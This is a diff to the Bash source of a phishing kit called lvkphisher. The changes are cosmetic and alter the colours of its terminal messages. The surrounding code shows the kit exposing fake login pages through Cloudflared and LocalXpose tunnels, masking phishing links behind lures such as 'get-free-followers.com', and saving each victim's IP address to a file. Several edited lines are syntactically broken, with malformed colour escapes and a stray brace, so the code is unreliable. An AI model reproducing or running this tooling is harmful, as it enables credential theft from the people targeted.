@@ -163,7 +163,7 @@ kill_pid() {
 
 # Check for a newer release
 check_update(){
-	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
+	echo -ne "\n${GREEN}[${WHITE}+${GREEN}][38;2;0;255;170m Checking for update : "
 	relase_url='https://api.github.com/repos/LvkPhisher/lvkphisher/releases/latest'
 	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
 	tarball_url="https://github.com/lvk777/lvkphisher/archive/refs/tags/${new_version}.tar.gz"
@@ -171,7 +171,7 @@ check_update(){
 	if [[ $new_version != $__version__ ]]; then
 		echo -ne "${ORANGE}update found\n"${WHITE}
 		sleep 2
-		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Downloading Update..."
+		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Downloading Update..."
 		pushd "$HOME" > /dev/null 2>&1
 		curl --silent --insecure --fail --retry-connrefused \
 		--retry 3 --retry-delay 2 --location --output ".lvkphisher.tar.gz" "${tarball_url}"
@@ -414,7 +414,7 @@ setup_site() {
 capture_ip() {
 	IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
 	IFS=$'\n'
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Victim's IP : ${BLUE}$IP"
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
 	cat .server/www/ip.txt >> auth/ip.txt
 }
@@ -456,7 +456,7 @@ start_cloudflared() {
 	cusport
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Initializing... ${BLUE}( ${WHITE}http://$HOST:$PORT ${BLUE})"
 	{ sleep 1; setup_site; }
-	echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Launching Cloudflared..."
+	echo -ne "\n\n${RED}[${WHITE}-${RED}][38;2;0;255;170m Launching Cloudflared..."
 
 	if [[ `command -v termux-chroot` ]]; then
 		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
@@ -476,7 +476,7 @@ localxpose_auth() {
 	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 
 
 	[ "$(./.server/loclx account status | grep Error)" ] && {
-		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
+		echo -e "\n\n${RED}[${WHITE}!${RED}][38;2;0;255;170m Create an account on ${WHITE}localxpose.io[38;2;0;255;170m & copy the token\n"
 		sleep 3
 		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Input Loclx Token :${ORANGE} " loclx_token
 		[[ $loclx_token == "" ]] && {
@@ -490,12 +490,12 @@ localxpose_auth() {
 ## Start LocalXpose (Again...)
 start_loclx() {
 	cusport
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	echo -e "\n${RED}[${WHITE}-${RED}][38;2;0;255;170m Initializing... ${WHITE}( ${BLUE}http://$HOST:$PORT ${WHITE})"
 	{ sleep 1; setup_site; localxpose_auth; }
 	echo -e "\n"
-	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
+	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Change Loclx Server Region? ${WHITE}[${BLUE}y${WHITE}/${BLUE}N${WHITE}]:[38;2;0;255;170m " opinion
 	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
-	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
+	echo -e "\n\n${RED}[${WHITE}-${RED}][38;2;0;255;170m Launching LocalXpose..."
 
 	if [[ `command -v termux-chroot` ]]; then
 		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
@@ -512,7 +512,7 @@ start_loclx() {
 ## Start localhost
 start_localhost() {
 	cusport
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${WHITE}( [38;2;0;255;170mhttp://$HOST:$PORT ${WHITE})"
+	echo -e "\n${RED}[${WHITE}-${RED}][38;2;0;255;170m Initializing... ${WHITE}( [38;2;0;255;170mhttp://$HOST:$PORT ${WHITE})"
 	setup_site
 	{ sleep 1; clear; banner_small; }
 	echo -e "\n${RED}[${WHITE}-${RED}][38;2;0;255;170m Successfully Hosted at : ${WHITE}[38;2;0;255;170mhttp://$HOST:$PORT ${WHITE}"
@@ -552,12 +552,12 @@ custom_mask() {
 	echo
 	if [[ ${mask_op,,} == "y" ]]; then
 		echo -e "\n${RED}[${WHITE}+${RED}][38;2;0;255;170m Enter your custom URL below ${WHITE}(${BLUE}Example: https://get-free-followers.com${WHITE})\n"
-		read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url # initial text requires Bash 4+
+		read -e -p "${WHITE} ==> ${WHITE}" -i "https://" mask_url # initial text requires Bash 4+
 		if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
 			mask=$mask_url
-			echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask"
+			echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${BLUE} $mask"
 		else
-			echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Invalid url type..Using the Default one.."
+			echo -e "\n${RED}[${WHITE}!${RED}]${RED} Invalid url type..Using the Default one.."
 		fi
 	fi
 }
@@ -602,7 +602,7 @@ custom_url() {
 
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${[38;2;0;255;170m}$url"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${[38;2;0;255;170m}$processed_url"
-	[[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${[38;2;0;255;170m}$masked_url"
+	[[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : [38;2;0;255;170m}$masked_url"
 }
 
 ## Facebook
